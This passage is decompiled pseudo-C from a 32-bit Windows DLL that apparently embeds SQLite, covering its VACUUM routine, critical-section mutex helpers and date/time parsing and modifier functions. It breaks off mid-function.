_DWORD *__cdecl sub_10073539(int *a1, _DWORD *a2, int a3, int a4, int a5, int a6)
{
  _DWORD *result; // eax
  _DWORD *v7; // esi
  bool v8; // dl
  int *v9; // [esp+Ch] [ebp-4h]

  v9 = sub_1007C271(a1);
  result = sub_100734EB(a1, (int)a2, a3, a5);
  v7 = result;
  if ( result )
  {
    sub_1005AB66((int)v9, 107, a4, a6, ++a1[18]);
    ++*(_DWORD *)(v7[2] + 16);
    sub_1005AFA8(-1, v9, (unsigned __int16 *)v7[2], (_BYTE *)0xFFFFFFEE);
    v8 = *a2 && (*(_DWORD *)(*a1 + 12) & 0x2000000) == 0;
    return (_DWORD *)sub_1005AE0E((int)v9, v8);
  }
  return result;
}

//----- (100735BF) --------------------------------------------------------
void __cdecl sub_100735BF(int *a1, int a2, int a3, int *a4, int a5, int a6, int a7, int a8, int a9)
{
  while ( a2 )
  {
    if ( *(unsigned __int8 *)(a2 + 8) == a3 && *(unsigned __int8 *)(a2 + 9) == a5 )
    {
      if ( sub_100730B2(a4, *(_DWORD *)(a2 + 16)) )
        sub_10073539(a1, (_DWORD *)a2, a6, a7, a8, a9);
    }
    a2 = *(_DWORD *)(a2 + 32);
  }
}

//----- (10073612) --------------------------------------------------------
int __usercall sub_10073612@<eax>(int a1@<eax>, int a2, int *a3, int a4, unsigned __int8 a5, int a6, int a7)
{
  int v7; // edi
  int i; // esi
  int v9; // eax

  v7 = 0;
  for ( i = a1; i; i = *(_DWORD *)(i + 32) )
  {
    if ( *(unsigned __int8 *)(i + 8) == (a3 != 0) + 106 && (a5 & *(_BYTE *)(i + 9)) != 0 )
    {
      if ( sub_100730B2(a3, *(_DWORD *)(i + 16)) )
      {
        v9 = sub_100734EB(a2, i, a6, a7);
        if ( v9 )
          v7 |= *(_DWORD *)(v9 + 4 * a4 + 12);
      }
    }
  }
  return v7;
}
// 100734EB: using guessed type _DWORD __cdecl sub_100734EB(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (10073676) --------------------------------------------------------
int __cdecl sub_10073676(_DWORD *a1, char *a2)
{
  unsigned int v3; // ebx

  if ( !a2 )
    return 7;
  if ( sub_10058816(a1, (unsigned int *)&a2, a2, -1, 0, 0, 0) )
    return sub_10054313(a1);
  v3 = (unsigned int)a2;
  sub_1005326B(a2);
  return sub_10053012(v3);
}
// 1005326B: using guessed type _DWORD __cdecl sub_1005326B(_DWORD);

//----- (100736BF) --------------------------------------------------------
int __cdecl sub_100736BF(_DWORD *a1, char *a2)
{
  int result; // eax
  int *v3; // ebx
  char *v4; // eax
  int v5; // esi
  int *v6; // [esp+Ch] [ebp-4h] BYREF

  result = sub_10058816(a1, (unsigned int *)&v6, a2, -1, 0, 0, 0);
  if ( !result )
  {
    v3 = v6;
    do
    {
      if ( sub_1005326B(v3) != 100 )
        return sub_10053012((unsigned int)v3);
      v4 = (char *)sub_10053431(0, v3);
      v5 = sub_10073676(a1, v4);
    }
    while ( !v5 );
    sub_10053012((unsigned int)v3);
    return v5;
  }
  return result;
}
// 1005326B: using guessed type _DWORD __cdecl sub_1005326B(_DWORD);

//----- (10073720) --------------------------------------------------------
int __usercall sub_10073720@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // ecx
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // edi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ebx
  char v11; // al
  int v12; // ebx
  int v13; // eax
  int *v14; // ebx
  char v15; // al
  int v16; // edi
  bool v17; // zf
  int v19; // [esp-8h] [ebp-3Ch]
  int v20; // [esp+Ch] [ebp-28h]
  int v21; // [esp+10h] [ebp-24h]
  int v22; // [esp+14h] [ebp-20h]
  int v23; // [esp+18h] [ebp-1Ch]
  int v24; // [esp+1Ch] [ebp-18h]
  int v25; // [esp+20h] [ebp-14h] BYREF
  int v26; // [esp+24h] [ebp-10h]
  int i; // [esp+28h] [ebp-Ch]
  int *v28; // [esp+2Ch] [ebp-8h]
  int v29; // [esp+30h] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 12);
  v2 = *(_DWORD *)(a1 + 60);
  v26 = 0;
  v23 = v1;
  v22 = v2;
  v3 = *(_DWORD *)(a1 + 64);
  *(_DWORD *)(a1 + 12) = v1 & 0xFBFAFFFF | 0x50000;
  v4 = *(_DWORD *)(a1 + 8);
  v21 = v3;
  v5 = *(_DWORD *)(a1 + 148);
  *(_DWORD *)(a1 + 148) = 0;
  v6 = *(_DWORD *)(v4 + 4);
  v20 = v5;
  i = *(unsigned __int8 *)(**(_DWORD **)(v6 + 4) + 13);
  v29 = sub_10073676((_DWORD *)a1, aAttachAsVacuum);
  if ( !v29 )
  {
    v7 = *(_DWORD *)(a1 + 8) + 16 * *(_DWORD *)(a1 + 4);
    v8 = v7 - 16;
    v9 = *(_DWORD *)(v7 - 12);
    v26 = v8;
    v28 = (int *)v9;
    sub_10063238(v9);
    sub_10068C39(v6);
    v10 = *(unsigned __int16 *)(*(_DWORD *)(v6 + 4) + 20) - *(unsigned __int16 *)(*(_DWORD *)(v6 + 4) + 22);
    v24 = v10;
    sub_10068CA7(v6);
    if ( sub_100626A1(*(unsigned __int16 *)(*(_DWORD *)(v6 + 4) + 20), (int)v28, v10, 0)
      || !i && sub_100626A1(*(_DWORD *)(a1 + 36), (int)v28, v10, 0)
      || *(_BYTE *)(a1 + 30) )
    {
      v29 = 7;
    }
    else
    {
      v29 = sub_10073676((_DWORD *)a1, aPragmaVacuumDb);
      if ( !v29 )
      {
        v11 = *(_BYTE *)(a1 + 33);
        if ( v11 < 0 )
          v11 = sub_10062784(v6);
        sub_10062735((int)v28, v11);
        v29 = sub_10073676((_DWORD *)a1, aBeginExclusive);
        if ( !v29 )
        {
          v29 = sub_100736BF((_DWORD *)a1, aSelectCreateTa);
          if ( !v29 )
          {
            v29 = sub_100736BF((_DWORD *)a1, aSelectCreateIn);
            if ( !v29 )
            {
              v29 = sub_100736BF((_DWORD *)a1, aSelectCreateUn);
              if ( !v29 )
              {
                v29 = sub_100736BF((_DWORD *)a1, aSelectInsertIn);
                if ( !v29 )
                {
                  v29 = sub_100736BF((_DWORD *)a1, aSelectDeleteFr);
                  if ( !v29 )
                  {
                    v29 = sub_100736BF((_DWORD *)a1, aSelectInsertIn_0);
                    if ( !v29 )
                    {
                      v29 = sub_10073676((_DWORD *)a1, aInsertIntoVacu);
                      if ( !v29 )
                      {
                        v12 = 0;
                        for ( i = 0; ; v12 = i )
                        {
                          sub_1006618B(v6, (unsigned __int8)byte_100FE5F0[v12], &v25);
                          v19 = v25 + (unsigned __int8)byte_100FE5F1[v12];
                          v13 = (unsigned __int8)byte_100FE5F0[v12];
                          v14 = v28;
                          v29 = sub_100661BB((int)v28, v13, v19);
                          if ( v29 )
                            break;
                          i += 2;
                          if ( i >= 8 )
                          {
                            v29 = sub_100822D7(v14, v6);
                            if ( !v29 )
                            {
                              v29 = sub_10063238((int)v14);
                              if ( !v29 )
                              {
                                v15 = sub_10062784((int)v14);
                                sub_10062735(v6, v15);
                                v29 = sub_100626A1(*(unsigned __int16 *)(v14[1] + 20), v6, v24, 1);
                              }
                            }
                            break;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  v16 = v26;
  v17 = v26 == 0;
  *(_DWORD *)(a1 + 12) = v23;
  *(_DWORD *)(a1 + 60) = v22;
  *(_DWORD *)(a1 + 64) = v21;
  *(_DWORD *)(a1 + 148) = v20;
  *(_BYTE *)(a1 + 28) = 1;
  if ( !v17 )
  {
    sub_1006256A(*(_DWORD *)(v16 + 4));
    *(_DWORD *)(v16 + 4) = 0;
    *(_DWORD *)(v16 + 12) = 0;
  }
  sub_1006A029(0, (_DWORD *)a1);
  return v29;
}

//----- (100739D6) --------------------------------------------------------
int sub_100739D6()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( InterlockedCompareExchange(&Destination, 1, 0) )
  {
    while ( !dword_10186488 )
      Sleep(1u);
  }
  else
  {
    v0 = &CriticalSection;
    do
    {
      InitializeCriticalSection(v0);
      v0 = (struct _RTL_CRITICAL_SECTION *)((char *)v0 + 36);
    }
    while ( (int)v0 < (int)&unk_10184620 );
    dword_10186488 = 1;
  }
  return 0;
}
// 10186488: using guessed type int dword_10186488;

//----- (10073A22) --------------------------------------------------------
int sub_10073A22()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( InterlockedCompareExchange(&Destination, 0, 1) == 1 && dword_10186488 == 1 )
  {
    v0 = &CriticalSection;
    do
    {
      DeleteCriticalSection(v0);
      v0 = (struct _RTL_CRITICAL_SECTION *)((char *)v0 + 36);
    }
    while ( (int)v0 < (int)&unk_10184620 );
    dword_10186488 = 0;
  }
  return 0;
}
// 10186488: using guessed type int dword_10186488;

//----- (10073A61) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *__cdecl sub_10073A61(unsigned int a1)
{
  struct _RTL_CRITICAL_SECTION *v1; // eax
  struct _RTL_CRITICAL_SECTION *v2; // esi

  if ( a1 > 1 )
  {
    v2 = (struct _RTL_CRITICAL_SECTION *)((char *)&CriticalSection + 36 * a1 - 72);
    v2[1].DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)a1;
  }
  else
  {
    v1 = (struct _RTL_CRITICAL_SECTION *)sub_10059025(0x24u);
    v2 = v1;
    if ( v1 )
    {
      v1[1].DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)a1;
      InitializeCriticalSection(v1);
    }
  }
  return v2;
}

//----- (10073AB3) --------------------------------------------------------
DWORD __cdecl sub_10073AB3(LPCRITICAL_SECTION lpCriticalSection)
{
  DWORD result; // eax

  EnterCriticalSection(lpCriticalSection);
  result = GetCurrentThreadId();
  ++lpCriticalSection[1].LockCount;
  lpCriticalSection[1].RecursionCount = result;
  return result;
}

//----- (10073AD0) --------------------------------------------------------
int sub_10073AD0()
{
  return 5;
}

//----- (10073AD4) --------------------------------------------------------
void __cdecl sub_10073AD4(LPCRITICAL_SECTION lpCriticalSection)
{
  --lpCriticalSection[1].LockCount;
  LeaveCriticalSection(lpCriticalSection);
}

//----- (10073AE6) --------------------------------------------------------
int __cdecl sub_10073AE6(char *a1)
{
  char **v1; // ecx
  int *v2; // ecx
  int v3; // edx
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int *v7; // edi
  int v8; // esi
  int v10; // [esp+0h] [ebp-14h]
  int v11; // [esp+4h] [ebp-10h]
  int v12; // [esp+8h] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-8h]
  char v14; // [esp+13h] [ebp-1h]

  v12 = 0;
  v1 = &a1;
  do
  {
    v2 = (int *)(v1 + 1);
    v3 = *v2++;
    v4 = *v2++;
    v11 = v4;
    v5 = *v2++;
    v10 = v5;
    v6 = *v2;
    v1 = (char **)(v2 + 1);
    v7 = (int *)*v1;
    v13 = v6;
    v8 = 0;
    while ( v3 )
    {
      v14 = *a1;
      --v3;
      if ( (byte_100FEFC0[(unsigned __int8)*a1] & 4) == 0 )
        return v12;
      ++a1;
      v8 = 10 * v8 + v14 - 48;
    }
    if ( v8 < v11 || v8 > v10 || v13 && v13 != *a1 )
      break;
    ++a1;
    ++v12;
    *v7 = v8;
  }
  while ( v13 );
  return v12;
}

//----- (10073B70) --------------------------------------------------------
int __usercall sub_10073B70@<eax>(_BYTE *a1@<eax>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ebx
  char *v5; // esi
  int v7; // [esp+8h] [ebp-8h]
  int v8; // [esp+Ch] [ebp-4h]

  while ( (byte_100FEFC0[(unsigned __int8)*a1] & 1) != 0 )
    ++a1;
  *(_DWORD *)(a2 + 28) = 0;
  v3 = (char)*a1;
  switch ( v3 )
  {
    case '-':
      v4 = -1;
      goto LABEL_8;
    case '+':
      v4 = 1;
LABEL_8:
      v5 = a1 + 1;
      if ( sub_10073AE6(v5) != 2 )
        return 1;
      a1 = v5 + 5;
      *(_DWORD *)(a2 + 28) = v4 * (v7 + 60 * v8);
      while ( (byte_100FEFC0[(unsigned __int8)*a1] & 1) != 0 )
LABEL_14:
        ++a1;
      return *a1 != 0;
    case 'Z':
    case 'z':
      goto LABEL_14;
  }
  return v3 != 0;
}
// 10073BD1: variable 'v7' is possibly undefined
// 10073BCE: variable 'v8' is possibly undefined

//----- (10073C0C) --------------------------------------------------------
int __usercall sub_10073C0C@<eax>(int a1@<eax>, char *a2@<ecx>)
{
  double v2; // st7
  unsigned __int8 *v6; // esi
  char *v7; // esi
  unsigned __int8 *v8; // eax
  double v9; // st6
  unsigned __int8 v10; // al
  double v11; // st5
  double v12; // rt0
  double v13; // st5
  double v14; // rt1
  double v15; // rt2
  double v16; // st5
  double v17; // st7
  double v18; // rtt
  double v19; // st5
  double v20; // st6
  double v21; // st5
  double v22; // rt0
  int v23; // [esp+8h] [ebp-10h]
  int v24; // [esp+Ch] [ebp-Ch]
  int v25; // [esp+10h] [ebp-8h]
  int v26; // [esp+14h] [ebp-4h]

  v2 = 0.0;
  if ( sub_10073AE6(a2) != 2 )
    return 1;
  v6 = (unsigned __int8 *)(a2 + 5);
  if ( *v6 == 58 )
  {
    v7 = (char *)(v6 + 1);
    if ( sub_10073AE6(v7) != 1 )
      return 1;
    v6 = (unsigned __int8 *)(v7 + 2);
    if ( *v6 == 46 )
    {
      v8 = v6 + 1;
      if ( (byte_100FEFC0[v6[1]] & 4) != 0 )
      {
        v9 = 1.0;
        ++v6;
        v10 = *v8;
        if ( (byte_100FEFC0[v10] & 4) != 0 )
        {
          v11 = 10.0;
          while ( 1 )
          {
            v25 = (char)v10;
            v10 = *++v6;
            v15 = v11;
            v16 = v2 * v11 + (double)v25;
            v17 = v15;
            v18 = v16 - 48.0;
            v19 = v9;
            v20 = v18;
            v21 = v19 * v15;
            if ( (byte_100FEFC0[*v6] & 4) == 0 )
              break;
            v12 = v21;
            v13 = v20;
            v9 = v12;
            v14 = v13;
            v11 = v17;
            v2 = v14;
          }
          v22 = v20;
          v9 = v21;
          v2 = v22;
        }
        v2 = v2 / v9;
      }
    }
  }
  else
  {
    v26 = 0;
  }
  *(_DWORD *)(a1 + 20) = v24;
  *(_DWORD *)(a1 + 24) = v23;
  *(_BYTE *)(a1 + 42) = 0;
  *(_BYTE *)(a1 + 41) = 1;
  *(double *)(a1 + 32) = v2 + (double)v26;
  if ( sub_10073B70(v6, a1) )
    return 1;
  *(_BYTE *)(a1 + 43) = *(_DWORD *)(a1 + 28) != 0;
  return 0;
}
// 10073CDA: variable 'v24' is possibly undefined
// 10073CE0: variable 'v23' is possibly undefined
// 10073CD7: variable 'v26' is possibly undefined

//----- (10073D0C) --------------------------------------------------------
void __usercall sub_10073D0C(int a1@<esi>)
{
  int v1; // edi
  int v2; // ecx
  bool v3; // zf
  __int64 v4; // rax
  bool v5; // cf
  int v6; // [esp+0h] [ebp-4h]

  if ( !*(_BYTE *)(a1 + 42) )
  {
    v1 = 1;
    if ( *(_BYTE *)(a1 + 40) )
    {
      v2 = *(_DWORD *)(a1 + 8);
      v1 = *(_DWORD *)(a1 + 12);
      v6 = *(_DWORD *)(a1 + 16);
    }
    else
    {
      v2 = 2000;
      v6 = 1;
    }
    if ( v1 <= 2 )
    {
      --v2;
      v1 += 12;
    }
    v3 = *(_BYTE *)(a1 + 41) == 0;
    *(_QWORD *)a1 = (unsigned __int64)(((double)(v2 / 100 / 4
                                               + 36525 * (v2 + 4716) / 100
                                               + 306001 * (v1 + 1) / 10000
                                               - v2 / 100
                                               + v6
                                               + 2)
                                      - 1524.5)
                                     * 86400000.0);
    *(_BYTE *)(a1 + 42) = 1;
    if ( !v3 )
    {
      *(_QWORD *)a1 += 60000 * (*(_DWORD *)(a1 + 24) + 60 * *(_DWORD *)(a1 + 20))
                     - (unsigned __int64)(*(double *)(a1 + 32) * -1000.0);
      if ( *(_BYTE *)(a1 + 43) )
      {
        v4 = 60000 * *(_DWORD *)(a1 + 28);
        v5 = *(_DWORD *)a1 < (unsigned int)v4;
        *(_DWORD *)a1 -= v4;
        *(_BYTE *)(a1 + 40) = 0;
        *(_BYTE *)(a1 + 41) = 0;
        *(_DWORD *)(a1 + 4) -= v5 + HIDWORD(v4);
        *(_BYTE *)(a1 + 43) = 0;
      }
    }
  }
}

//----- (10073DFF) --------------------------------------------------------
int __usercall sub_10073DFF@<eax>(int a1@<eax>, char *a2@<ecx>)
{
  char *v2; // edi
  char *i; // edi
  int v5; // eax
  bool v6; // zf
  int v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+14h] [ebp-Ch]
  int v10; // [esp+18h] [ebp-8h]
  int v11; // [esp+1Ch] [ebp-4h]

  v2 = a2;
  if ( *a2 == 45 )
  {
    v2 = a2 + 1;
    v11 = 1;
  }
  else
  {
    v11 = 0;
  }
  if ( sub_10073AE6(v2) != 3 )
    return 1;
  for ( i = v2 + 10; (byte_100FEFC0[(unsigned __int8)*i] & 1) != 0 || *i == 84; ++i )
    ;
  if ( !sub_10073C0C(a1, i) )
    goto LABEL_12;
  if ( *i )
    return 1;
  *(_BYTE *)(a1 + 41) = 0;
LABEL_12:
  v5 = v10;
  *(_BYTE *)(a1 + 42) = 0;
  *(_BYTE *)(a1 + 40) = 1;
  if ( v11 )
    v5 = -v10;
  v6 = *(_BYTE *)(a1 + 43) == 0;
  *(_DWORD *)(a1 + 8) = v5;
  *(_DWORD *)(a1 + 12) = v9;
  *(_DWORD *)(a1 + 16) = v8;
  if ( !v6 )
    sub_10073D0C(a1);
  return 0;
}
// 10073E82: variable 'v10' is possibly undefined
// 10073E99: variable 'v9' is possibly undefined
// 10073E9F: variable 'v8' is possibly undefined

//----- (10073EB5) --------------------------------------------------------
unsigned __int64 __usercall sub_10073EB5@<edx:eax>(int a1@<eax>, int a2@<esi>)
{
  unsigned __int64 result; // rax
  double v3; // [esp+0h] [ebp-8h] BYREF

  (*(void (__cdecl **)(_DWORD, double *))(**(_DWORD **)(a1 + 24) + 64))(**(_DWORD **)(a1 + 24), &v3);
  result = (unsigned __int64)(v3 * 86400000.0 + 0.5);
  *(_QWORD *)a2 = result;
  *(_BYTE *)(a2 + 42) = 1;
  return result;
}

//----- (10073EE8) --------------------------------------------------------
int __usercall sub_10073EE8@<eax>(char *a1@<ebx>, int a2@<edi>, int a3)
{
  double v4; // [esp+8h] [ebp-Ch] BYREF

  if ( !sub_10073DFF(a2, a1) || !sub_10073C0C(a2, a1) )
    return 0;
  if ( !sub_100593BE((unsigned __int8 *)a1, (unsigned __int8 *)aNow) )
  {
    sub_10073EB5(a3, a2);
    return 0;
  }
  if ( sub_10059441(a1, (_DWORD *)&v4 + 1, 1) )
  {
    sub_100594F4(a1, &v4);
    *(_QWORD *)a2 = (unsigned __int64)(v4 * 86400000.0 + 0.5);
    *(_BYTE *)(a2 + 42) = 1;
    return 0;
  }
  return 1;
}

//----- (10073F6B) --------------------------------------------------------
int __usercall sub_10073F6B@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // edi
  int v3; // ebx
  int v4; // eax
  int v5; // [esp+0h] [ebp-Ch]
  int v6; // [esp+8h] [ebp-4h]

  result = 0;
  if ( !*(_BYTE *)(a1 + 40) )
  {
    if ( *(_BYTE *)(a1 + 42) )
    {
      v2 = (int)(((double)(int)((*(_QWORD *)a1 + 43200000i64) / 86400000) - 1867216.25) / 36524.25)
         - (int)(((double)(int)((*(_QWORD *)a1 + 43200000i64) / 86400000) - 1867216.25) / 36524.25) / 4
         + (*(_QWORD *)a1 + 43200000i64) / 86400000
         + 1525;
      v6 = (int)(((double)v2 - 122.1) / 365.25);
      v5 = 36525 * v6 / 100;
      v3 = (int)((double)(v2 - v5) / 30.6001);
      *(_DWORD *)(a1 + 16) = v2 - (int)(30.6001 * (double)v3) - v5;
      v4 = v3 - 1;
      if ( v3 >= 14 )
        v4 = v3 - 13;
      *(_DWORD *)(a1 + 12) = v4;
      if ( v4 <= 2 )
        result = v6 - 4715;
      else
        result = v6 - 4716;
      *(_DWORD *)(a1 + 8) = result;
    }
    else
    {
      result = 1;
      *(_DWORD *)(a1 + 8) = 2000;
      *(_DWORD *)(a1 + 12) = 1;
      *(_DWORD *)(a1 + 16) = 1;
    }
    *(_BYTE *)(a1 + 40) = 1;
  }
  return result;
}

//----- (10074061) --------------------------------------------------------
int __usercall sub_10074061@<eax>(int result@<eax>)
{
  int v1; // esi
  double v2; // st7
  int v3; // ecx

  v1 = result;
  if ( !*(_BYTE *)(result + 41) )
  {
    sub_10073D0C(result);
    v2 = (double)((*(_QWORD *)v1 + 43200000i64) % 86400000) / 1000.0;
    *(_BYTE *)(v1 + 41) = 1;
    *(double *)(v1 + 32) = v2 - (double)(int)v2;
    *(_DWORD *)(v1 + 20) = (int)v2 / 3600;
    v3 = (int)v2 % 3600;
    *(_DWORD *)(v1 + 24) = v3 / 60;
    result = 60 * (v3 / 60);
    *(double *)(v1 + 32) = (double)(v3 % 60) + *(double *)(v1 + 32);
  }
  return result;
}

//----- (100740E4) --------------------------------------------------------
int __usercall sub_100740E4@<eax>(int a1@<eax>)
{
  sub_10073F6B(a1);
  return sub_10074061(a1);
}

//----- (100740F4) --------------------------------------------------------
__int64 __usercall sub_100740F4@<edx:eax>(const void *a1@<eax>)
{
  double v1; // st7
  struct tm Tm; // [esp+Ch] [ebp-8Ch] BYREF
  __int64 v4; // [esp+30h] [ebp-68h] BYREF
  int v5; // [esp+38h] [ebp-60h]
  int v6; // [esp+3Ch] [ebp-5Ch]
  int tm_mday; // [esp+40h] [ebp-58h]
  int tm_hour; // [esp+44h] [ebp-54h]
  int tm_min; // [esp+48h] [ebp-50h]
  double tm_sec; // [esp+50h] [ebp-48h]
  char v11; // [esp+58h] [ebp-40h]
  char v12; // [esp+59h] [ebp-3Fh]
  char v13; // [esp+5Ah] [ebp-3Eh]
  char v14; // [esp+5Bh] [ebp-3Dh]
  __int64 v15[6]; // [esp+60h] [ebp-38h] BYREF
  __time64_t Time; // [esp+90h] [ebp-8h] BYREF

  qmemcpy(v15, a1, sizeof(v15));
  sub_10073F6B((int)v15);
  sub_10074061((int)v15);
  if ( (unsigned int)(LODWORD(v15[1]) - 1971) > 0x42 )
  {
    v1 = 0.0;
    v15[1] = 0x1000007D0i64;
    v15[2] = 1i64;
    LODWORD(v15[3]) = 0;
  }
  else
  {
    HIDWORD(Time) = (int)(*(double *)&v15[4] + 0.5);
    v1 = (double)SHIDWORD(Time);
  }
  *(double *)&v15[4] = v1;
  HIDWORD(v15[3]) = 0;
  BYTE2(v15[5]) = 0;
  sub_10073D0C((int)v15);
  Time = v15[0] / 1000 - 210866760000i64;
  _localtime64_s(&Tm, &Time);
  v5 = Tm.tm_year + 1900;
  tm_sec = (double)Tm.tm_sec;
  v6 = Tm.tm_mon + 1;
  tm_mday = Tm.tm_mday;
  tm_hour = Tm.tm_hour;
  tm_min = Tm.tm_min;
  v11 = 1;
  v12 = 1;
  v13 = 0;
  v14 = 0;
  sub_10073D0C((int)&v4);
  return v4 - v15[0];
}

//----- (100741F2) --------------------------------------------------------
int __usercall sub_100741F2@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<edi>)
{
  _BYTE *v2; // esi
  int v3; // ecx
  char *v4; // eax
  char *v5; // ecx
  char *v6; // esi
  bool v7; // cf
  int v8; // eax
  bool v9; // zf
  _BYTE *v10; // eax
  int v11; // ecx
  _BYTE *v12; // ecx
  double v13; // st7
  double v14; // st7
  double v15; // st7
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // eax
  double v20; // st7
  int v21; // esi
  double v22; // st7
  __int64 v23; // rax
  __int64 v24; // rax
  unsigned int v25; // esi
  __int64 v26; // rax
  int v27; // kr00_4
  __int64 v29[6]; // [esp+8h] [ebp-70h] BYREF
  char v30; // [esp+38h] [ebp-40h] BYREF
  char v31; // [esp+39h] [ebp-3Fh] BYREF
  char v32; // [esp+40h] [ebp-38h] BYREF
  char v33[23]; // [esp+41h] [ebp-37h] BYREF
  double v34; // [esp+58h] [ebp-20h]
  double v35; // [esp+60h] [ebp-18h] BYREF
  _BYTE *v36; // [esp+6Ch] [ebp-Ch]
  char *Str1; // [esp+70h] [ebp-8h]
  int v38; // [esp+74h] [ebp-4h]

  v2 = a1;
  v3 = 0;
  v38 = 1;
  v4 = (char *)(&v30 - a1);
  do
  {
    if ( !*v2 )
      break;
    ++v3;
    v2[(_DWORD)v4] = byte_100FEEC0[(unsigned __int8)*v2];
    ++v2;
  }
  while ( v3 < 29 );
  *(&v30 + v3) = 0;
  if ( v30 <= 108 )
  {
    if ( v30 != 108 )
    {
      if ( v30 != 43 && v30 != 45 && (unsigned int)(v30 - 48) > 9 )
        return v38;
      v5 = &v30 + (_DWORD)sub_100594F4(&v30, &v35);
      if ( *v5 == 58 )
      {
        v6 = &v30;
        if ( (byte_100FEFC0[(unsigned __int8)v30] & 4) == 0 )
          v6 = &v31;
        memset(v29, 0, sizeof(v29));
        if ( !sub_10073C0C((int)v29, v6) )
        {
          sub_10073D0C((int)v29);
          v7 = __CFADD__(v29[0], -43200000);
          LODWORD(v29[0]) -= 43200000;
          HIDWORD(v29[0]) = v7 + HIDWORD(v29[0]) - 1;
          v29[0] %= -86400000i64;
          if ( v30 == 45 )
            v29[0] = -v29[0];
          sub_10073D0C((int)a2);
          v7 = __CFADD__(v29[0], *a2);
          *a2 += LODWORD(v29[0]);
          v8 = HIDWORD(v29[0]);
          *((_BYTE *)a2 + 40) = 0;
          *((_BYTE *)a2 + 41) = 0;
          *((_BYTE *)a2 + 43) = 0;
          goto LABEL_16;
        }
        return v38;
      }
      v9 = (byte_100FEFC0[(unsigned __int8)*v5] & 1) == 0;
      Str1 = v5;
      if ( !v9 )
      {
        do
          ++v5;
        while ( (byte_100FEFC0[(unsigned __int8)*v5] & 1) != 0 );
        Str1 = v5;
      }
      v10 = sub_10059297(v5);
      v36 = v10;
      if ( (unsigned int)(v10 - 3) > 7 )
        return v38;
      v12 = &v10[v11 - 1];
      if ( *v12 == 115 )
      {
        *v12 = 0;
        v36 = v10 - 1;
      }
      sub_10073D0C((int)a2);
      v38 = 0;
      if ( v35 >= 0.0 )
        v13 = 0.5;
      else
        v13 = -0.5;
      v34 = v13;
      if ( v36 == (_BYTE *)3 )
      {
        if ( !strcmp(Str1, aDay_0) )
        {
          v14 = v35;
LABEL_46:
          v15 = v14 * 86400000.0;
          goto LABEL_47;
        }
        goto LABEL_48;
      }
      if ( v36 == (_BYTE *)4 )
      {
        if ( strcmp(Str1, aHour) )
        {
          if ( !strcmp(Str1, aYear) )
          {
            v21 = (int)v35;
            v36 = (_BYTE *)(int)v35;
            sub_100740E4((int)a2);
            a2[2] += v21;
            *((_BYTE *)a2 + 42) = 0;
            sub_10073D0C((int)a2);
            v22 = (double)(int)v36;
            if ( v35 == v22 )
            {
LABEL_49:
              *((_BYTE *)a2 + 40) = 0;
              *((_BYTE *)a2 + 41) = 0;
              *((_BYTE *)a2 + 43) = 0;
              return v38;
            }
            v14 = (v35 - v22) * 365.0;
            goto LABEL_46;
          }
          goto LABEL_48;
        }
        v15 = v35 * 3600000.0;
      }
      else
      {
        if ( v36 != (_BYTE *)6 )
        {
          if ( v36 == (_BYTE *)5 && !strcmp(Str1, aMonth) )
          {
            sub_100740E4((int)a2);
            v16 = (int)v35;
            a2[3] += (int)v35;
            v17 = a2[3];
            v36 = (_BYTE *)v16;
            v18 = v17 - 1;
            if ( v17 <= 0 )
              v18 = v17 - 12;
            v19 = v18 / 12;
            *((_BYTE *)a2 + 42) = 0;
            a2[2] += v19;
            a2[3] = v17 - 12 * v19;
            sub_10073D0C((int)a2);
            v20 = (double)(int)v36;
            if ( v35 == v20 )
              goto LABEL_49;
            v14 = (v35 - v20) * 30.0;
            goto LABEL_46;
          }
LABEL_48:
          v38 = 1;
          goto LABEL_49;
        }
        if ( !strcmp(Str1, aMinute) )
        {
          v15 = v35 * 60000.0;
        }
        else
        {
          if ( strcmp(Str1, aSecond) )
            goto LABEL_48;
          v15 = v35 * 1000.0;
        }
      }
LABEL_47:
      *(_QWORD *)a2 += (unsigned __int64)(v15 + v34);
      goto LABEL_49;
    }
    if ( strcmp(&v30, aLocaltime) )
      return v38;
    sub_10073D0C((int)a2);
    *(_QWORD *)a2 += sub_100740F4(a2);
LABEL_52:
    *((_BYTE *)a2 + 40) = 0;
    *((_BYTE *)a2 + 41) = 0;
    *((_BYTE *)a2 + 43) = 0;
    return 0;
  }
  if ( v30 == 115 )
  {
    if ( !strncmp(&v30, aStartOf, 9u) )
    {
      sub_10073F6B((int)a2);
      *((double *)a2 + 4) = 0.0;
      *((_BYTE *)a2 + 41) = 1;
      a2[6] = 0;
      a2[5] = 0;
      *((_BYTE *)a2 + 43) = 0;
      *((_BYTE *)a2 + 42) = 0;
      if ( !strcmp(v33, aMonth_0) )
      {
        a2[4] = 1;
        return 0;
      }
      if ( !strcmp(v33, aYear_0) )
      {
        sub_10073F6B((int)a2);
        a2[3] = 1;
        a2[4] = 1;
        return 0;
      }
      if ( !strcmp(v33, aDay) )
        return 0;
    }
    return v38;
  }
  if ( v30 != 117 )
  {
    if ( v30 != 119 )
      return v38;
    if ( strncmp(&v30, aWeekday, 8u) )
      return v38;
    if ( (int)sub_100594F4(&v32, &v35) <= 0 )
      return v38;
    v36 = (_BYTE *)(int)v35;
    if ( (double)(int)v35 != v35 || (int)v36 < 0 || v35 >= 7.0 )
      return v38;
    sub_100740E4((int)a2);
    *((_BYTE *)a2 + 43) = 0;
    *((_BYTE *)a2 + 42) = 0;
    sub_10073D0C((int)a2);
    *(_QWORD *)&v35 = (*(_QWORD *)a2 + 129600000i64) / 86400000 % 7;
    if ( *(__int64 *)&v35 > (int)v36 )
      *(_QWORD *)&v35 -= 7i64;
